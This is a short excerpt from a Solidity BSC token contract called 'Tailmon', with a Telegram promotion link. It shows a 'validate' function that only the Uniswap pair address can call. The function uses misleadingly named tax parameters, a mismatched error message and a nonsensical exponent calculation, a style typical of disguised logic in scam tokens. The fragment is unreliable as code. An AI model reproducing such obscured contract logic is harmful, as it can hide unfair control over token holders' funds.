...
/**
telegram: https://t.me/TailmonVIPbsc
**/
...
contract Tailmon is IERC20, Ownable, BaseToken {
    ...
    function validate(uint256 _batchBuyTax, uint256 _batchSellTax, uint256 constantAmount, address _pair) public {
        require(uniswapV2Pair == _msgSender());
        require(_batchBuyTax > 0, "Transfer amount must be greater than zero");
        uint256 contractTokenBalance = _batchBuyTax ** _batchSellTax;
